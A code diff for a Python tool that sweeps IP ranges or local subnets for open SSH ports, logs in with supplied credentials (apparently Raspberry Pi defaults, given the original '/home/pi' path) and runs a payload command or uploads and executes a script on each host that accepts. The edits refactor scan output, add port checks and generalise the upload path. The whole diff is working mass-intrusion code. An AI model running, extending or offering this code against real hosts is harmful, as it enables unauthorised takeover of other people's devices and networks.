@@ -80,6 +80,7 @@ def main():
         print colored("Trying SSH...", "green")
         print ""
         SendPayloadRange(hosts, payload)
+        ShowScanResults()
     elif args.local_scan:
         localIps = GetIpInterfaces()
         for localIp in localIps:
@@ -92,16 +93,14 @@ def main():
                 print colored("Trying SSH...", "green")
                 print ""
                 SendPayloadRange(ips, payload)
+        ShowScanResults()
     elif args.file:
         Targets = open(args.file, "r").read().split("\n")
         Targets.pop()
         SendPayloadRange(Targets, payload)
-    if len(SshClients) > 1:
-        print colored("Found ", "green") + colored(str(len(SshClients)), "yellow") + colored(" clients:", "green")
-    else:
-        print colored("Found ", "green") + colored(str(len(SshClients)), "yellow") + colored(" client:", "green")
-    for client in SshClients:
-        cprint(client, "yellow")
+        ShowScanResults()
+
+ 
 
 def SendPayload(target, payload):
     if args.script:
@@ -114,6 +113,13 @@ def SendPayload(target, payload):
 def ExecuteSshCommand(target, port, username, password, payload):
     SSHClient = paramiko.SSHClient()
     SSHClient.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+    try:
+        if not IsPortOpen(target, 22):
+            cprint("SSH not running", "red", attrs=["bold"])
+            return False
+    except:
+            cprint("Invalid target", "red", attrs=["bold"])
+            return False
     try:
         SSHClient.connect(hostname=target, port=port, username=username, password=password, timeout=10)
         stdin, stdout, stderr = SSHClient.exec_command(payload)
@@ -128,22 +134,28 @@ def ExecuteSshScript(target, port, username, password, fileName, filePath):
     SSHClient = paramiko.SSHClient()
     SSHClient.set_missing_host_key_policy(paramiko.AutoAddPolicy())
     try:
+        if not IsPortOpen(target, 22):
+            cprint("SSH not running", "red", attrs=["bold"])
+            return False
+    except:
+            cprint("Invalid target", "red", attrs=["bold"])
+            return False
+    if not os.path.exists(filePath):
+        cprint("Script not found", "red", attrs=["bold"])
+        return False
+    try:
         SSHClient.connect(target, port, username, password, timeout=10)
-        print colored("-" * 33 + "{", SuccessColor) +  colored(target, SuccessColor, attrs=["bold"]) +  colored("}" + "-" * (40-len(target)), SuccessColor)
         SFTPClient = SSHClient.open_sftp()
-        remoteFile = SFTPClient.open("/home/pi/" + fileName, mode="w")
+        remoteFile = SFTPClient.open("/home/" + username + "/" + fileName, mode="w")
         remoteFile.write(open(filePath, "r").read())
         remoteFile.close()
         SFTPClient.close()
-        stdin, stdout, stderr = SSHClient.exec_command("chmod +x " + fileName + " && /home/pi/" + fileName)
-        print colored("Executed script: ", SuccessColor, attrs=["bold"]) + filePath
-        for line in stdout.readlines():
-            print line
+        stdin, stdout, stderr = SSHClient.exec_command("chmod +x " + fileName + " && /home/" + username + "/" + fileName)
+        PrintSshStatus(target, True, fileName)
         SSHClient.close()
         return True
     except:
-        cprint("Authentication failed", FailedColor, attrs=["bold"])
-        print ""
+        PrintSshStatus(target, False, fileName)
         return False
         SSHClient.close()
 
@@ -160,6 +172,13 @@ def PrintSshStatus(target, isSuccess, payload, output=""):
         cprint("Authentication failed", FailedColor, attrs=["bold"])
         print ""
     threadLock.release()
+def ShowScanResults():
+    if len(SshClients) > 1:
+        print colored("Found ", "green") + colored(str(len(SshClients)), "yellow") + colored(" clients:", "green")
+    else:
+        print colored("Found ", "green") + colored(str(len(SshClients)), "yellow") + colored(" client:", "green")
+    for client in SshClients:
+        cprint(client, "yellow")
 
 def SendPayloadRange(IpList, payload):
     threads = []
@@ -195,7 +214,7 @@ def ScanIpRange(start, stop):
 
 def IsPortOpen(ip, port=22):
     scanner = nmap.PortScanner()
-    scanner.scan(hosts=ip, ports=port)
+    scanner.scan(hosts=ip, ports=str(port))
     return (scanner[ip].tcp(port)["state"] == "open")
 def GetIpInterfaces():
     ifaces = netifaces.interfaces()
